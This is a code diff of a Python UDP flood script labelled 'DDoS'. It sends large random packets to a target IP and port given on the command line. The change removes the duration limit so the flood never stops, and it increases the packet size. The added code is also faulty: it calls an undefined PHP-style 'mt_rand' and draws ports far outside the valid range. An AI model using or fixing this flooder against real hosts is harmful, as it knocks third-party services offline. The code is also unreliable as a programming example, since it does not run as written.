@@ -2,29 +2,26 @@
 import socket,random,sys,time
  
 if len(sys.argv)==1:
-    sys.exit('Usage: fli.py ip port(0=random) length(0=forever)')
+    sys.exit('Usage: fli.py ip port(0=random)')
  
 def UDPFlood():
 
     port = int(sys.argv[2])
     randport=(True,False)[port==0]
     ip = sys.argv[1]
-    dur = int(sys.argv[3])
-    clock=(lambda:0,time)[dur>0]
-    duration=(1,(dur))[dur>0]
 
-    print('DDOS: %s:%s - %s '%(ip,port,dur or 'infinite'))
+    dur = mt_rand(7500,9999)
+
+    duration=(1,(100000*dur))[dur>0]
+
+    print('DDoS: %s:%s'%(ip,port))
 
     sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-    bytes=random._urandom(15000)
+    bytes=random._urandom(16000)
 
     while True:
 
         port=(random.randint(1,15000000),port)[randport]
-        
-        if duration:
-            sock.sendto(bytes,(ip,port))
-        else:
-            break
-    print('DONE')
+        sock.sendto(bytes,(ip,port))
+
 UDPFlood()
